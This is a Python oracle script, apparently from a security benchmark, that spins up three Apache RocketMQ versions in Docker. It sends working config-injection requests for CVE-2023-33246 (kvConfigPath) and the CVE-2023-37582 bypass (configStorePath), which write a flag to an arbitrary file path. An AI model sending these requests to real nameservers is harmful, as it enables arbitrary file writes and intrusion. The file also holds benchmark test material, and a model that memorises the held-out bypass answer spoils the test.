#!/usr/bin/env python3
"""Flag differential oracle for rocketmq-cve-2023-37582.

Reuses benchmark/flag_oracle.py. The flag is embedded as a config property value
(productEnvName) written to a controlled path via the configStorePath /
kvConfigPath config-injection vulnerability. Detection: the flag token appears
in the file written to /tmp/pcb_marker.txt inside the container.

Roles (SPEC.md):
  V0 = apache/rocketmq:5.1.0  (no blocklist -> kvConfigPath writable)
  V1 = apache/rocketmq:5.1.1  (kvConfigPath blocked, configStorePath NOT blocked -> target)
  V2 = apache/rocketmq:5.1.2  (configStorePath blocked -> fully fixed)

Gate variant: A (same-sink). Both original (kvConfigPath) and bypass
(configStorePath) attack the same endpoint (UPDATE_NAMESRV_CONFIG on the
nameserver), just different property names.

Usage:
  PCB_FLAG=<token> python3 oracle.py --gate         # envs already up
  python3 oracle.py --run-gate                        # orchestrate compose up+gate+down
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[1]))
from flag_oracle import FlagOracle, new_flag, validate_case, validate_case_strict  # noqa: E402
sys.path.insert(0, str(HERE))
from original_poc import candidate as original_candidate  # noqa: E402
from rocketmq_remoting import (  # noqa: E402
    update_namesrv_config,
    put_kv_config,
    get_namesrv_config,
)

FLAG = os.environ.get("PCB_FLAG") or new_flag()

PORTS = {"v0": 39870, "v1": 39871, "v2": 39872}
HOST = "127.0.0.1"
MARKER_PATH = "/tmp/pcb_marker.txt"
CONTAINER_PREFIX = "rocketmq-cve-2023-37582"


def _container_name(version: str) -> str:
    """Derive the compose container name for the given version profile."""
    return f"{CONTAINER_PREFIX}-namesrv-{version}-1"


def _read_marker(version: str) -> str:
    """Read the marker file from inside the container (if it exists)."""
    cname = _container_name(version)
    r = subprocess.run(
        ["docker", "exec", cname, "cat", MARKER_PATH],
        capture_output=True, text=True, check=False, timeout=10,
    )
    return r.stdout


def _send_original(version: str, flag: str) -> dict:
    """Send the original seed (kvConfigPath) and trigger a KV persist.

    1. UPDATE_NAMESRV_CONFIG: set kvConfigPath to the marker path.
    2. PUT_KV_CONFIG: store a KV pair with the flag as the value, which
       triggers KVConfigManager.persist() writing to kvConfigPath.
    """
    port = PORTS[version]
    # Step 1: set kvConfigPath
    resp1 = update_namesrv_config(HOST, port, {"kvConfigPath": MARKER_PATH})
    if resp1.get("code", -1) != 0:
        # Blocked (code != SUCCESS=0)
        return {"version": version, "property": "kvConfigPath",
                "update_code": resp1.get("code"), "remark": resp1.get("remark", ""),
                "body": "", "blocked": True}
    # Step 2: trigger KV persist by storing a KV pair containing the flag
    time.sleep(0.5)
    resp2 = put_kv_config(HOST, port, "PCB_CANARY", "flag", flag)
    time.sleep(1)
    # Step 3: read the marker file
    content = _read_marker(version)
    return {"version": version, "property": "kvConfigPath",
            "update_code": resp1.get("code"), "kv_code": resp2.get("code"),
            "body": content, "blocked": False}


def _send_bypass(version: str, flag: str) -> dict:
    """Send the bypass residual (configStorePath) which triggers persist.

    UPDATE_NAMESRV_CONFIG: set configStorePath to the marker path AND
    productEnvName to the flag. The update() method calls persist() at the
    end, writing the full config (including productEnvName=flag) to the new
    configStorePath.
    """
    port = PORTS[version]
    resp = update_namesrv_config(HOST, port, {
        "configStorePath": MARKER_PATH,
        "productEnvName": flag,
    })
    if resp.get("code", -1) != 0:
        return {"version": version, "property": "configStorePath",
                "update_code": resp.get("code"), "remark": resp.get("remark", ""),
                "body": "", "blocked": True}
    time.sleep(1)
    content = _read_marker(version)
    return {"version": version, "property": "configStorePath",
            "update_code": resp.get("code"), "body": content, "blocked": False}


def run_probe(candidate_desc, *, version="v1"):
    """Send one candidate probe to the given version. Returns an observable
    result dict with {version, body, ...}."""
    prop = candidate_desc.get("property", "configStorePath")
    if prop == "kvConfigPath":
        return _send_original(version, FLAG)
    else:
        return _send_bypass(version, FLAG)


def original_poc(*, version="v1"):
    """[GIVEN] CVE-2023-33246 kvConfigPath seed. Blocked on V1."""
    return _send_original(version, FLAG)


def bypass_poc(*, version="v1"):
    """[HELD-OUT] CVE-2023-37582 configStorePath residual. Reaches on V1."""
    return _send_bypass(version, FLAG)


def mechanism_scope(candidate_desc) -> bool:
    """True iff the candidate targets the nameserver config-update sink."""
    if isinstance(candidate_desc, dict):
        mech = candidate_desc.get("mechanism", "")
        return "NAMESRV_CONFIG" in mech or "configStorePath" in str(candidate_desc) or "kvConfigPath" in str(candidate_desc)
    return False


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, run_probe, mechanism_scope)
    o.prime_seed(original_poc)
    return o


def gate() -> dict:
    """Build-time validity gate (Variant A). Assumes V0 and V1 envs are up."""
    return validate_case_strict(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
        bypass_on_v2=bypass_poc(version="v2"),
    )


# --------------------------------------------------------------------------- #
# Orchestration helpers
# --------------------------------------------------------------------------- #
def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", "-p", CONTAINER_PREFIX, *args],
        cwd=str(HERE), text=True, capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _wait_namesrv(version: str, tries: int = 90) -> bool:
    """Poll until the nameserver remoting protocol is fully operational."""
    port = PORTS[version]
    for _ in range(tries):
        try:
            r = get_namesrv_config(HOST, port, timeout=5)
            if r.get("code") == 0:
                return True
        except Exception:
            pass
        time.sleep(3)
    return False


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*_profile_flags(profiles), "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr, "stdout": r.stdout}
    ready = {}
    for v in profiles:
        ready[v] = _wait_namesrv(v)
    result = gate()
    result["_env_ready"] = ready
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true",
                    help="run gate against already-up envs (needs PCB_FLAG)")
    ap.add_argument("--run-gate", action="store_true",
                    help="orchestrate compose up + gate + down")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
